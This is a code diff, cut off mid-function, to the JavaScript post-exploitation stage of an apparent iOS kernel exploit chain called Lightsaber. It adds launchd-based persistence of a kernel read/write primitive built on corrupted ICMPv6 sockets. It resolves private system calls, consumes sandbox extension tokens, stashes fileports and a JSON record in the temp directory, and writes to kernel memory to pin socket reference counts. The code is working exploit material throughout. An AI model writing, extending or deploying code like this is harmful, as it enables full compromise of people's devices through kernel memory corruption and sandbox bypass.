@@ -1,5 +1,7 @@
 (() => {
+  const LS_PE_PAYLOAD_REVISION = "20260904.7";
   const PE_ENABLE_DEBUG_NETWORK = globalThis.__pe_enable_debug_network === true;
+  const LS_RETAIN_KRW_FOR_VISIBLE_TEST = false;
   // Ultra-early beacon - before fcall_init, using XMLHttpRequest if available
   try {
     if (PE_ENABLE_DEBUG_NETWORK && typeof XMLHttpRequest !== 'undefined') {
@@ -13,7 +15,6 @@
   if (typeof LOG === 'undefined' || LOG === undefined) {
     LOG = function(msg) { console.log('[PE] ' + msg); };
   }
-
   function peAck(stage) {
     try {
       if (typeof globalThis.__pe_ack_addr === 'bigint' && typeof uwrite64 === 'function') {
@@ -403,6 +404,8 @@
   let IPPROTO_ICMPV6 = 58n;
   let ICMP6_FILTER = 18n;
   let SEEK_SET = 0n;
+  let QOS_CLASS_USER_INITIATED = 0x19n;
+  let QOS_CLASS_BACKGROUND = 0x09n;
   let _NSGETEXECUTABLEPATH = func_resolve("_NSGetExecutablePath");
   let ACCESS = func_resolve("access");
   let CONFSTR = func_resolve("confstr");
@@ -419,6 +422,8 @@
   let MEMMEM = func_resolve("memmem");
   let MEMSET_PATTERN8 = func_resolve("memset_pattern8");
   let OPEN = func_resolve("open");
+  let PROC_NAME = func_resolve("proc_name");
+  let PROC_PIDPATH = func_resolve("proc_pidpath");
   let PREADV = func_resolve("preadv");
   let PWRITEV = func_resolve("pwritev");
   let PWRITE = func_resolve("pwrite");
@@ -433,9 +438,16 @@
   let STRRCHR = func_resolve("strrchr");
   let PTHREAD_SELF = func_resolve("pthread_self");
   let PTHREAD_JOIN = func_resolve("pthread_join");
+  let PTHREAD_SET_QOS_CLASS_SELF_NP = func_resolve("pthread_set_qos_class_self_np");
   let WRITE = func_resolve("write");
   let REMOVE = func_resolve("remove");
+  let RENAME = func_resolve("rename");
   let ARC4RANDOM = func_resolve("arc4random");
+  let SYSCTLBYNAME = func_resolve("sysctlbyname");
+  let TASK_GET_SPECIAL_PORT = func_resolve("task_get_special_port");
+  let BOOTSTRAP_LOOK_UP = func_resolve("bootstrap_look_up");
+  let BOOTSTRAP_UNREGISTER = func_resolve("bootstrap_unregister");
+  let SANDBOX_EXTENSION_CONSUME = func_resolve("sandbox_extension_consume");
   let TASK_THREADS = func_resolve("task_threads");
   let THREAD_SUSPEND = func_resolve("thread_suspend");
   let MACH_MAKE_MEMORY_ENTRY_64 = func_resolve("mach_make_memory_entry_64");
@@ -486,6 +498,9 @@
   function pthread_join(thr, val) {
     return fcall(PTHREAD_JOIN, thr, val);
   }
+  function pthread_set_qos_class_self_np(qos_class, relative_priority) {
+    return fcall(PTHREAD_SET_QOS_CLASS_SELF_NP, qos_class, relative_priority);
+  }
   function _NSGetExecutablePath(executable_path, length_ptr) {
     return fcall(_NSGETEXECUTABLEPATH, executable_path, length_ptr);
   }
@@ -528,11 +543,32 @@
   function memmem(big, big_len, little, little_len) {
     return fcall(MEMMEM, big, big_len, little, little_len);
   }
+  function reverse_memmem(big, big_len, little, little_len) {
+    if (little_len == 0n) return big;
+    if (big_len < little_len) return 0n;
+    let search_offset = 0n;
+    let last_found = 0n;
+    while (search_offset + little_len <= big_len) {
+      let found = memmem(big + search_offset, big_len - search_offset, little, little_len);
+      if (found == 0n) break;
+      last_found = found;
+      search_offset = found - big + 1n;
+    }
+    return last_found;
+  }
   function access(path, mode) {
     return fcall(ACCESS, path, mode);
   }
   function open(path, mode) {
     return fcall(OPEN, path, mode);
+  }
+  function proc_name(pid, buffer, size) {
+    if (!PROC_NAME) return -1n;
+    return fcall(PROC_NAME, pid, buffer, size);
+  }
+  function proc_pidpath(pid, buffer, size) {
+    if (!PROC_PIDPATH) return -1n;
+    return fcall(PROC_PIDPATH, pid, buffer, size);
   }
   function fopen(path, mode) {
     return fcall(FOPEN, path, mode);
@@ -655,6 +691,9 @@
   disarm_gc();
   enable_gc();
   let executable_name = 0n;
+  const MAX_PROCESS_MARKERS = 8;
+  const PROCESS_MARKER_MAX_LEN = 64;
+  let process_markers = [];
   let read_file_path = 0n;
   let write_file_path = 0n;
   let target_file_size = PAGE_SIZE * 0x2n;
@@ -698,6 +737,56 @@
     fcntl(read_fd, 48n, 1n);
     fcntl(write_fd, 48n, 1n);
   }
+  function add_process_marker(marker) {
+    if (typeof marker !== "string" || marker.length == 0) return;
+    marker = marker.slice(0, PROCESS_MARKER_MAX_LEN - 1);
+    if (marker.length == 0 || process_markers.some((entry) => entry.name === marker)) return;
+    if (process_markers.length >= MAX_PROCESS_MARKERS) return;
+    process_markers.push({
+      name: marker,
+      pointer: get_cstring(marker),
+      length: BigInt(marker.length)
+    });
+  }
+  function add_process_marker_variants(marker) {
+    add_process_marker(marker);
+    if (typeof marker === "string" && marker.length > 15) {
+      add_process_marker(marker.slice(0, 15));
+    }
+  }
+  function init_process_markers() {
+    process_markers = [];
+    let guest_name = read_cstring_js(executable_name, PROCESS_MARKER_MAX_LEN);
+    let host_path_buffer = calloc(1n, 1024n);
+    let kernel_name_buffer = calloc(1n, BigInt(PROCESS_MARKER_MAX_LEN));
+    let host_path = "";
+    let kernel_name = "";
+    try {
+      let host_path_result = proc_pidpath(getpid(), host_path_buffer, 1024n);
+      if (!native_result_is_negative(host_path_result) && BigInt(host_path_result) > 0n) {
+        host_path = read_cstring_js(host_path_buffer, 1024);
+      }
+      let kernel_name_result = proc_name(getpid(), kernel_name_buffer, BigInt(PROCESS_MARKER_MAX_LEN));
+      if (!native_result_is_negative(kernel_name_result) && BigInt(kernel_name_result) > 0n) {
+        kernel_name = read_cstring_js(kernel_name_buffer, PROCESS_MARKER_MAX_LEN);
+      }
+    } finally {
+      free(kernel_name_buffer);
+      free(host_path_buffer);
+    }
+
+    // Lightsaber injects this stage into mediaplaybackd, so Lara's normal
+    // process branch applies: guest executable marker, kernel process marker,
+    // and each marker's 15-byte variant when required.
+    add_process_marker_variants(guest_name);
+    add_process_marker_variants(kernel_name);
+    LOG("[PE-A18] executable_name: " + (guest_name || "(unknown)"));
+    LOG("[PE-A18] host_executable_path: " + (host_path || "(unknown)"));
+    LOG("[PE-A18] kernel_process_name: " + (kernel_name || "(unknown)"));
+    for (let marker_idx = 0; marker_idx < process_markers.length; marker_idx++) {
+      LOG("[PE-A18] process_marker " + marker_idx + ": " + process_markers[marker_idx].name);
+    }
+  }
   function pe_init() {
     init_target_file();
     if (executable_name == 0n) {
@@ -710,6 +799,9 @@
       } else {
         executable_name = executable_path;
       }
+    }
+    if (is_a18_devices) {
+      init_process_markers();
     }
     free_thread_arg = calloc(1n, PAGE_SIZE);
     LOG("[+] free_thread_arg: " + free_thread_arg.hex());
@@ -855,14 +947,62 @@
   let rw_socket = 0n;
   let control_socket_pcb = 0n;
   let rw_socket_pcb = 0n;
+  let retained_socket_ports = [];
+  let pending_krw_socket_ports = [];
+  const PE_A18_CLEANUP_UNSAFE = -2n;
+  let a18_cleanup_unsafe = false;
+  let unsafe_a18_socket_ports = [];
+  let krw_socket_pin_active = false;
+  let krw_recovered_from_launchd = false;
+  let krw_stash_verified = false;
+  let krw_pin_control_socket_addr = 0n;
+  let krw_pin_rw_socket_addr = 0n;
+  let krw_pin_control_socket_count = 0n;
+  let krw_pin_rw_socket_count = 0n;
   let krw_restore_snapshot_valid = false;
   let krw_restore_control_filter = 0n;
   let krw_restore_control_cksum = 0n;
   let krw_restore_rw_filter = 0n;
   let krw_restore_rw_cksum = 0n;
   let krw_terminal_cleanup_started = false;
+  let krw_provider_hold_active = false;
   let EARLY_KRW_LENGTH = 0x20n;
   let control_data = calloc(1n, EARLY_KRW_LENGTH);
+  function krw_persist_log(event, detail = "") {
+    let suffix = String(detail || "").replace(/[\r\n]+/g, " ");
+    if (suffix.length > 384) suffix = suffix.slice(0, 384);
+    LOG("[KRW-PERSIST] event=" + event +
+        " recovered=" + (krw_recovered_from_launchd ? "1" : "0") +
+        " pinned=" + (krw_socket_pin_active ? "1" : "0") +
+        " stash=" + (krw_stash_verified ? "1" : "0") +
+        " hold=" + (krw_provider_hold_active ? "1" : "0") +
+        " snapshot=" + (krw_restore_snapshot_valid ? "1" : "0") +
+        " control_fd=" + control_socket + " rw_fd=" + rw_socket +
+        (suffix ? " " + suffix : ""));
+  }
+  function krw_begin_provider_hold(reason) {
+    if (krw_provider_hold_active) {
+      krw_persist_log("provider-hold-existing", reason ? "reason=" + reason : "");
+      return true;
+    }
+    try {
+      let begin = func_resolve("xpc_transaction_begin");
+      if (!begin || begin == 0n) {
+        LOG("[KRW-HOLD] xpc_transaction_begin unavailable" + (reason ? ": " + reason : ""));
+        krw_persist_log("provider-hold-unavailable", reason ? "reason=" + reason : "");
+        return false;
+      }
+      fcall(begin);
+      krw_provider_hold_active = true;
+      LOG("[KRW-HOLD] provider transaction active" + (reason ? ": " + reason : ""));
+      krw_persist_log("provider-hold-active", reason ? "reason=" + reason : "");
+      return true;
+    } catch (e) {
+      LOG("[KRW-HOLD] provider transaction failed: " + String(e));
+      krw_persist_log("provider-hold-failed", "error=" + String(e));
+      return false;
+    }
+  }
   function set_target_kaddr(where) {
     memset(control_data, 0n, EARLY_KRW_LENGTH);
     uwrite64(control_data, where);
@@ -980,8 +1120,387 @@
   const OFFSET_PCB_SOCKET = 0x40n;
   const OFFSET_SOCKET_SO_COUNT = 0x254n;
   const ICMP6FILT_OFFSET = 0x148n;
+  const KRW_STASH_VERSION = 1;
+  const KRW_STASH_SCHEME = "launchd-fileport-v1";
+  const KRW_STASH_FILENAME = "lightsaber_krw_v1.json";
+  const KRW_STASH_MAX_SIZE = 8192n;
+  const KRW_MACH_REGISTER = "com.apple.security.exception.mach-register.global-name";
+  const KRW_MACH_LOOKUP = "com.apple.security.exception.mach-lookup.global-name";
+  // launchd retains the fileports across provider-process exits. A boot change
+  // destroys those rights, so the record is bound to the exact boot and build.
   function is_kernel_pointer(ptr) {
     return ptr >= 0xffffff8000000000n && ptr <= 0xffffffffffffffffn;
+  }
+  function native_result_is_negative(value) {
+    try {
+      return BigInt.asIntN(64, BigInt(value)) < 0n;
+    } catch (_) {
+      return true;
+    }
+  }
+  function read_cstring_js(ptr, max_len = 1024) {
+    if (!ptr || ptr == 0n) return "";
+    let out = "";
+    for (let i = 0; i < max_len; i++) {
+      let ch = uread8(ptr + BigInt(i));
+      if (ch == 0) break;
+      out += String.fromCharCode(ch);
+    }
+    return out;
+  }
+  function uread32_from64(ptr) {
+    return Number(uread64(ptr) & 0xffffffffn);
+  }
+  function read_sysctl_string(name, max_len = 128n) {
+    let out = calloc(1n, max_len);
+    let out_len = calloc(1n, 8n);
+    try {
+      uwrite64(out_len, max_len);
+      let ret = fcall(SYSCTLBYNAME, get_cstring(name), out, out_len, 0n, 0n);
+      if (ret != 0n) return "";
+      return read_cstring_js(out, Number(max_len));
+    } finally {
+      free(out_len);
+      free(out);
+    }
+  }
+  function current_boot_id() {
+    let value = calloc(1n, 16n);
+    let value_len = calloc(1n, 8n);
+    try {
+      uwrite64(value_len, 16n);
+      let ret = fcall(SYSCTLBYNAME, get_cstring("kern.boottime"), value, value_len, 0n, 0n);
+      if (ret != 0n || uread64(value_len) < 12n) return "";
+      let seconds = uread64(value);
+      let microseconds = uread32_from64(value + 8n);
+      if (seconds == 0n) return "";
+      return seconds.toString(16) + ":" + BigInt(microseconds).toString(16);
+    } finally {
+      free(value_len);
+      free(value);
+    }
+  }
+  function krw_current_identity() {
+    return {
+      bootId: current_boot_id(),
+      model: read_cstring_js(get_device_machine(), 64),
+      build: read_sysctl_string("kern.osversion", 64n)
+    };
+  }
+  function krw_stash_path() {
+    const _CS_DARWIN_USER_TEMP_DIR = 65537n;
+    let temp = calloc(1n, 1024n);
+    try {
+      let needed = confstr(_CS_DARWIN_USER_TEMP_DIR, temp, 1024n);
+      if (needed == 0n || needed > 1024n) return "";
+      let base = read_cstring_js(temp, 1024);
+      if (!base) return "";
+      if (!base.endsWith("/")) base += "/";
+      return base + KRW_STASH_FILENAME;
+    } finally {
+      free(temp);
+    }
+  }
+  function krw_remove_stash_record() {
+    let path = krw_stash_path();
+    if (!path) {
+      krw_persist_log("record-remove-skipped", "reason=path-unavailable");
+      return false;
+    }
+    let existed = access(get_cstring(path), 0n) == 0n;
+    try { remove(get_cstring(path + ".new")); } catch (_) {}
+    try { remove(get_cstring(path)); } catch (_) {}
+    krw_persist_log("record-removed", "existed=" + (existed ? "1" : "0") + " path=" + path);
+    return true;
+  }
+  function krw_read_stash_record() {
+    let path = krw_stash_path();
+    if (!path) {
+      krw_persist_log("record-read-skipped", "reason=path-unavailable");
+      return null;
+    }
+    let fd = open(get_cstring(path), 0n);
+    if (native_result_is_negative(fd)) {
+      krw_persist_log("record-open-miss", "path=" + path);
+      return null;
+    }
+    let buf = calloc(1n, KRW_STASH_MAX_SIZE + 1n);
+    try {
+      let got = read(fd, buf, KRW_STASH_MAX_SIZE);
+      if (native_result_is_negative(got) || got <= 0n || got >= KRW_STASH_MAX_SIZE) {
+        krw_persist_log("record-read-invalid", "bytes=" + got + " path=" + path);
+        try { remove(get_cstring(path)); } catch (_) {}
+        return null;
+      }
+      let json = "";
+      for (let i = 0n; i < got; i++) {
+        let ch = uread8(buf + i);
+        if (ch == 0) {
+          krw_persist_log("record-read-invalid", "reason=nul-byte bytes=" + got + " path=" + path);
+          try { remove(get_cstring(path)); } catch (_) {}
+          return null;
+        }
+        json += String.fromCharCode(ch);
+      }
+      let record = JSON.parse(json);
+      krw_persist_log("record-read", "bytes=" + got + " path=" + path);
+      return record;
+    } catch (e) {
+      LOG("[KRW-STASH] record read failed: " + String(e));
+      krw_persist_log("record-read-failed", "error=" + String(e) + " path=" + path);
+      try { remove(get_cstring(path)); } catch (_) {}
+      return null;
+    } finally {
+      close(fd);
+      free(buf);
+    }
+  }
+  function krw_parse_hex(value) {
+    if (typeof value !== "string" || !/^0x[0-9a-fA-F]{1,16}$/.test(value)) return null;
+    try { return BigInt(value); } catch (_) { return null; }
+  }
+  function krw_valid_service_name(value, kind) {
+    if (typeof value !== "string" || value.length < 16 || value.length > 127) return false;
+    if (!/^[A-Za-z0-9._-]+$/.test(value)) return false;
+    return value.startsWith("com.0xjohnny.lightsaber.krw." + kind + ".");
+  }
+  function krw_valid_token(value, token_class) {
+    return typeof value === "string" && value.length > 0 && value.length <= 2048 &&
+      value.indexOf("\u0000") == -1 && value.includes(token_class);
+  }
+  function krw_validate_record(record, identity) {
+    if (!record || typeof record !== "object") {
+      krw_persist_log("record-invalid", "reason=shape");
+      return null;
+    }
+    if (record.version !== KRW_STASH_VERSION || record.scheme !== KRW_STASH_SCHEME) {
+      krw_persist_log("record-invalid", "reason=version-or-scheme version=" + record.version + " scheme=" + record.scheme);
+      return null;
+    }
+    if (!identity.bootId || !identity.build || !identity.model) {
+      krw_persist_log("record-invalid", "reason=current-identity-unavailable");
+      return null;
+    }
+    if (record.bootId !== identity.bootId || record.build !== identity.build || record.model !== identity.model) {
+      krw_persist_log("record-invalid", "reason=identity-mismatch boot_match=" +
+          (record.bootId === identity.bootId ? "1" : "0") + " model_match=" +
+          (record.model === identity.model ? "1" : "0") + " build_match=" +
+          (record.build === identity.build ? "1" : "0"));
+      return null;
+    }
+    if (!krw_valid_service_name(record.controlName, "c") ||
+        !krw_valid_service_name(record.rwName, "r")) {
+      krw_persist_log("record-invalid", "reason=service-name");
+      return null;
+    }
+    if (!krw_valid_token(record.controlLookupToken, KRW_MACH_LOOKUP) ||
+        !krw_valid_token(record.rwLookupToken, KRW_MACH_LOOKUP) ||
+        !krw_valid_token(record.controlRegisterToken, KRW_MACH_REGISTER) ||
+        !krw_valid_token(record.rwRegisterToken, KRW_MACH_REGISTER)) {
+      krw_persist_log("record-invalid", "reason=token-metadata");
+      return null;
+    }
+    let base = krw_parse_hex(record.kernelBase);
+    let slide = krw_parse_hex(record.kernelSlide);
+    if (base == null || slide == null || !is_kernel_pointer(base) ||
+        (base & (PAGE_SIZE - 1n)) != 0n || (slide & (PAGE_SIZE - 1n)) != 0n ||
+        base != 0xfffffff007004000n + slide) {
+      krw_persist_log("record-invalid", "reason=kernel-address");
+      return null;
+    }
+    return { record: record, kernelBase: base, kernelSlide: slide };
+  }
+  function krw_get_bootstrap_port() {
+    let out = calloc(1n, 8n);
+    try {
+      let ret = fcall(TASK_GET_SPECIAL_PORT, mach_task_self(), 4n, out);
+      if (ret != KERN_SUCCESS) return 0n;
+      return BigInt(uread32_from64(out));
+    } finally {
+      free(out);
+    }
+  }
+  function krw_consume_token(token) {
+    let ret = fcall(SANDBOX_EXTENSION_CONSUME, get_cstring(token));
+    return !native_result_is_negative(ret) && ret >= 1n;
+  }
+  function krw_lookup(bootstrap_port, name) {
+    let out = calloc(1n, 8n);
+    try {
+      let ret = fcall(BOOTSTRAP_LOOK_UP, bootstrap_port, get_cstring(name), out);
+      if (ret != KERN_SUCCESS) return 0n;
+      return BigInt(uread32_from64(out));
+    } finally {
+      free(out);
+    }
+  }
+  function krw_probe_socket_pair(control_fd, rw_fd, base) {
+    control_fd = BigInt(control_fd);
+    rw_fd = BigInt(rw_fd);
+    base = BigInt(base);
+    if (native_result_is_negative(control_fd) || native_result_is_negative(rw_fd) ||
+        control_fd <= 0n || rw_fd <= 0n || !is_kernel_pointer(base)) return false;
+    let target = calloc(1n, EARLY_KRW_LENGTH);
+    let output = calloc(1n, 8n);
+    let output_len = calloc(1n, 8n);
+    try {
+      uwrite64(target, base);
+      if (setsockopt(control_fd, IPPROTO_ICMPV6, ICMP6_FILTER, target, EARLY_KRW_LENGTH) != 0n) return false;
+      uwrite64(output_len, 8n);
+      if (getsockopt(rw_fd, IPPROTO_ICMPV6, ICMP6_FILTER, output, output_len) != 0n) return false;
+      return uread64(output_len) == 8n && uread64(output) == 0x100000cfeedfacfn;
+    } catch (_) {
+      return false;
+    } finally {
+      free(output_len);
+      free(output);
+      free(target);
+    }
+  }
+  function krw_unregister_record(validated) {
+    if (!validated) return;
+    let record = validated.record;
+    let bootstrap_port = krw_get_bootstrap_port();
+    if (!bootstrap_port) {
+      krw_persist_log("rollback-unregister-skipped", "reason=bootstrap-port-unavailable");
+      return;
+    }
+    krw_persist_log("rollback-unregister-start");
+    try { krw_consume_token(record.controlRegisterToken); } catch (_) {}
+    try { krw_consume_token(record.rwRegisterToken); } catch (_) {}
+    try { fcall(BOOTSTRAP_UNREGISTER, bootstrap_port, get_cstring(record.controlName)); } catch (_) {}
+    try { fcall(BOOTSTRAP_UNREGISTER, bootstrap_port, get_cstring(record.rwName)); } catch (_) {}
+    krw_persist_log("rollback-unregister-done");
+  }
+  function krw_recover_from_launchd() {
+    krw_persist_log("recovery-start", "path=" + (krw_stash_path() || "unavailable"));
+    let record = krw_read_stash_record();
+    if (!record) {
+      LOG("[KRW-STASH] no same-boot record");
+      krw_persist_log("recovery-no-record");
+      return false;
+    }
+    let identity = krw_current_identity();
+    let validated = krw_validate_record(record, identity);
+    if (!validated) {
+      LOG("[KRW-STASH] stale or invalid record removed");
+      krw_remove_stash_record();
+      return false;
+    }
+    krw_persist_log("recovery-record-valid", "model=" + identity.model + " build=" + identity.build);
+
+    let bootstrap_port = 0n;
+    let control_port = 0n;
+    let rw_port = 0n;
+    let recovered_control = 0n;
+    let recovered_rw = 0n;
+    let success = false;
+    try {
+      LOG("[KRW-STASH] attempting same-boot recovery");
+      if (!krw_consume_token(record.controlLookupToken)) throw new Error("control lookup token consume failed");
+      if (!krw_consume_token(record.rwLookupToken)) throw new Error("rw lookup token consume failed");
+      krw_persist_log("recovery-lookup-tokens-consumed");
+      bootstrap_port = krw_get_bootstrap_port();
+      if (!bootstrap_port) throw new Error("task_get_special_port bootstrap lookup failed");
+      krw_persist_log("recovery-bootstrap-ready", "bootstrap_port=" + bootstrap_port);
+      control_port = krw_lookup(bootstrap_port, record.controlName);
+      rw_port = krw_lookup(bootstrap_port, record.rwName);
+      if (!control_port || !rw_port) throw new Error("bootstrap_look_up failed");
+      krw_persist_log("recovery-services-resolved", "control_port=" + control_port + " rw_port=" + rw_port);
+      recovered_control = fileport_makefd(control_port);
+      recovered_rw = fileport_makefd(rw_port);
+      if (native_result_is_negative(recovered_control) || native_result_is_negative(recovered_rw)) {
+        throw new Error("fileport_makefd failed");
+      }
+      krw_persist_log("recovery-fds-created", "control_fd=" + recovered_control + " rw_fd=" + recovered_rw);
+      if (!krw_probe_socket_pair(recovered_control, recovered_rw, validated.kernelBase)) {
+        throw new Error("kernel magic probe failed");
+      }
+      krw_persist_log("recovery-probe-passed", "kernel_base=" + validated.kernelBase.hex());
+
+      control_socket = recovered_control;
+      rw_socket = recovered_rw;
+      kernel_base = validated.kernelBase;
+      kernel_slide = validated.kernelSlide;
+      control_socket_pcb = 0n;
+      rw_socket_pcb = 0n;
+      krw_socket_pin_active = true;
+      krw_recovered_from_launchd = true;
+      krw_stash_verified = true;
+      success = true;
+      LOG("[KRW-STASH] recovered same-boot KRW; kernel_base=" + kernel_base.hex());
+      krw_persist_log("recovery-active", "kernel_base=" + kernel_base.hex());
+      return true;
+    } catch (e) {
+      LOG("[KRW-STASH] recovery failed; falling back to full chain: " + String(e));
+      krw_persist_log("recovery-failed", "error=" + String(e));
+      krw_unregister_record(validated);
+      krw_remove_stash_record();
+      return false;
+    } finally {
+      if (!success) {
+        if (recovered_control > 0n && !native_result_is_negative(recovered_control)) try { close(recovered_control); } catch (_) {}
+        if (recovered_rw > 0n && !native_result_is_negative(recovered_rw)) try { close(recovered_rw); } catch (_) {}
+      }
+      if (control_port) try { mach_port_deallocate(mach_task_self(), control_port); } catch (_) {}
+      if (rw_port) try { mach_port_deallocate(mach_task_self(), rw_port); } catch (_) {}
+    }
+  }
+  function krw_write_stash_record(record) {
+    let path = krw_stash_path();
+    if (!path) {
+      krw_persist_log("record-write-failed", "reason=path-unavailable");
+      return false;
+    }
+    let json = JSON.stringify(record) + "\n";
+    if (json.length <= 1 || BigInt(json.length) >= KRW_STASH_MAX_SIZE) {
+      krw_persist_log("record-write-failed", "reason=size bytes=" + json.length + " path=" + path);
+      return false;
+    }
+    for (let i = 0; i < json.length; i++) {
+      if (json.charCodeAt(i) > 0x7f) {
+        krw_persist_log("record-write-failed", "reason=non-ascii path=" + path);
+        return false;
+      }
+    }
+    let temp_path = path + ".new";
+    let buf = calloc(1n, BigInt(json.length));
+    let fd = -1n;
+    try {
+      for (let i = 0; i < json.length; i++) uwrite8(buf + BigInt(i), json.charCodeAt(i));
+      try { remove(get_cstring(temp_path)); } catch (_) {}
+      fd = fcall(OPEN, get_cstring(temp_path), 0x601n, 0x180n);
+      if (native_result_is_negative(fd)) {
+        krw_persist_log("record-write-failed", "reason=open path=" + temp_path);
+        return false;
+      }
+      let offset = 0n;
+      while (offset < BigInt(json.length)) {
+        let written = write(fd, buf + offset, BigInt(json.length) - offset);
+        if (native_result_is_negative(written) || written <= 0n) {
+          krw_persist_log("record-write-failed", "reason=write offset=" + offset + " path=" + temp_path);
+          return false;
+        }
+        offset += written;
+      }
+      if (fsync(fd) != 0n) {
+        krw_persist_log("record-write-failed", "reason=fsync path=" + temp_path);
+        return false;
+      }
+      close(fd);
+      fd = -1n;
+      if (fcall(RENAME, get_cstring(temp_path), get_cstring(path)) != 0n) {
+        krw_persist_log("record-write-failed", "reason=rename path=" + path);
+        return false;
+      }
+      LOG("[KRW-STASH] wrote record at " + path);
+      krw_persist_log("record-committed", "bytes=" + json.length + " path=" + path);
+      return true;
+    } finally {
+      if (!native_result_is_negative(fd)) try { close(fd); } catch (_) {}
+      free(buf);
+      if (access(get_cstring(temp_path), 0n) == 0n) try { remove(get_cstring(temp_path)); } catch (_) {}
+    }
   }
   function krw_restore_snapshot_clear() {
     krw_restore_snapshot_valid = false;
@@ -1070,6 +1589,7 @@
     return true;
   }
   function krw_close_local_fds() {
+    krw_persist_log("local-fd-close-start");
     if (control_socket > 0n && control_socket != 0xFFFFFFFFFFFFFFFFn) {
       try { close(control_socket); } catch (_) {}
     }
@@ -1078,6 +1598,7 @@
     }
     control_socket = 0n;
     rw_socket = 0n;
+    krw_persist_log("local-fd-close-done");
   }
   function krw_bad_fd_result(ret) {
     return ret == 0xFFFFFFFFFFFFFFFFn || ret < 0n;
@@ -1129,52 +1650,45 @@
     }
   }
   function krw_terminal_cleanup(reason) {
+    krw_persist_log("terminal-cleanup-enter", reason ? "reason=" + reason : "");
+    if (a18_cleanup_unsafe) {
+      krw_begin_provider_hold("unsafe A18 rejected-pair state");
+      LOG("[PE-A18] unsafe rejected-pair cleanup; preserving process and socket rights for manual reboot");
+      krw_persist_log("terminal-preserve", "reason=unsafe-a18-state");
+      return true;
+    }
+    if (LS_RETAIN_KRW_FOR_VISIBLE_TEST && retained_socket_ports.length > 0) {
+      LOG("[PE-TEST] retaining KRW sockets for visible test; manual reboot required");
+      krw_persist_log("terminal-preserve", "reason=visible-test");
+      return true;
+    }
     if (krw_terminal_cleanup_started) {
       LOG("[KRW-CLEAN] terminal cleanup already attempted" + (reason ? ": " + reason : ""));
+      krw_persist_log("terminal-cleanup-skipped", "reason=already-attempted");
       return false;
     }
     krw_terminal_cleanup_started = true;
     LOG("[KRW-CLEAN] terminal cleanup requested" + (reason ? ": " + reason : ""));
 
-    if (!krw_restore_snapshot_valid) {
-      LOG("[KRW-CLEAN] no PCB restore snapshot; closing local fds only");
-      krw_close_local_fds();
-      return false;
-    }
-    if (!is_kernel_pointer(control_socket_pcb) || !is_kernel_pointer(rw_socket_pcb)) {
-      LOG("[KRW-CLEAN] invalid pcb control=" + control_socket_pcb.hex() + " rw=" + rw_socket_pcb.hex());
-      krw_close_local_fds();
-      krw_restore_snapshot_clear();
-      return false;
-    }
-    if (!krw_ready_for_terminal_cleanup()) {
-      LOG("[KRW-CLEAN] KRW primitive unavailable; closing local fds only");
-      krw_close_local_fds();
-      krw_restore_snapshot_clear();
-      return false;
+    // The socket primitive links the control filter field to the RW PCB filter
+    // field. Restoring the control field kills the primitive while leaving the
+    // RW field aimed at the control PCB, so this primitive cannot safely restore
+    // both fields by itself. Never close either socket while that link exists.
+    if (krw_socket_pin_active || krw_restore_snapshot_valid) {
+      krw_begin_provider_hold("corrupted KRW socket pair");
+      if (krw_socket_pin_active && krw_stash_verified) {
+        LOG("[KRW-STASH] verified launchd handoff is active; preserving provider and socket state");
+        krw_persist_log("terminal-preserve", "reason=verified-launchd-handoff");
+      } else {
+        LOG("[KRW-CLEAN] handoff is not verified; preserving unsafe socket state instead of closing it");
+        krw_persist_log("terminal-preserve", "reason=unverified-corrupted-pair");
+      }
+      return true;
     }
 
-    let restore = calloc(1n, EARLY_KRW_LENGTH);
-    let parked = false;
-    try {
-      LOG("[KRW-CLEAN] parking RW PCB fields and restoring control checksum");
-      early_kwrite64(control_socket_pcb + ICMP6FILT_OFFSET + 0x8n, krw_restore_control_cksum);
-
-      uwrite64(restore, krw_restore_rw_filter);
-      uwrite64(restore + 0x8n, krw_restore_rw_cksum);
-      early_kwrite32bytes(rw_socket_pcb + ICMP6FILT_OFFSET, restore);
-      parked = true;
-      LOG("[KRW-CLEAN] RW parked; control filter left linked by design");
-    } catch (e) {
-      LOG("[KRW-CLEAN] terminal cleanup failed: " + String(e));
-    } finally {
-      try { free(restore); } catch (_) {}
-      krw_close_local_fds();
-      krw_restore_snapshot_clear();
-    }
-
-    LOG("[KRW-CLEAN] terminal cleanup complete parked=" + (parked ? "true" : "false"));
-    return parked;
+    LOG("[KRW-CLEAN] no corrupted PCB snapshot; closing local fds");
+    krw_close_local_fds();
+    return false;
   }
   let socket_ports = [];
   let socket_pcb_ids = [];
@@ -1182,8 +1696,66 @@
   let getsockopt_read_length = 32n;
   let getsockopt_read_data = calloc(1n, getsockopt_read_length);
   let socket_info = calloc(1n, 0x400n);
+  function mark_a18_cleanup_unsafe(port) {
+    a18_cleanup_unsafe = true;
+    if (port != undefined && port != 0n && !unsafe_a18_socket_ports.includes(port)) {
+      unsafe_a18_socket_ports.push(port);
+    }
+    LOG("[PE-A18] rejected pair could not be restored; acquisition stopped before socket release");
+    return PE_A18_CLEANUP_UNSAFE;
+  }
+  function release_pending_krw_socket_ports() {
+    let released = pending_krw_socket_ports.length;
+    for (let idx = 0; idx < pending_krw_socket_ports.length; idx++) {
+      let port = pending_krw_socket_ports[idx];
+      if (port != undefined && port != 0n) {
+        try { mach_port_deallocate(mach_task_self(), port); } catch (_) {}
+      }
+    }
+    pending_krw_socket_ports = [];
+    krw_persist_log("pending-fileports-released", "count=" + released);
+  }
+  function krw_sockets_leak_forever() {
+    krw_persist_log("socket-pin-start", "control_pcb=" + control_socket_pcb.hex() + " rw_pcb=" + rw_socket_pcb.hex());
+    let control_socket_addr = early_kread64(control_socket_pcb + OFFSET_PCB_SOCKET);
+    let rw_socket_addr = early_kread64(rw_socket_pcb + OFFSET_PCB_SOCKET);
+    LOG("[KRW-STASH] control socket=" + control_socket_addr.hex() +
+        " rw socket=" + rw_socket_addr.hex());
+    if (!is_kernel_pointer(control_socket_addr) || !is_kernel_pointer(rw_socket_addr)) {
+      throw new Error("Lara-style socket pin found invalid socket pointers");
+    }
+
+    let control_socket_so_count = early_kread64(control_socket_addr + OFFSET_SOCKET_SO_COUNT);
+    let rw_socket_so_count = early_kread64(rw_socket_addr + OFFSET_SOCKET_SO_COUNT);
+    LOG("[KRW-STASH] pinning socket usecounts control=" + control_socket_so_count.hex() +
+        " rw=" + rw_socket_so_count.hex());
+    krw_pin_control_socket_addr = control_socket_addr;
+    krw_pin_rw_socket_addr = rw_socket_addr;
+    krw_pin_control_socket_count = control_socket_so_count;
+    krw_pin_rw_socket_count = rw_socket_so_count;
+    early_kwrite64(control_socket_addr + OFFSET_SOCKET_SO_COUNT,
+                   control_socket_so_count + KRW_LEAK_DELTA);
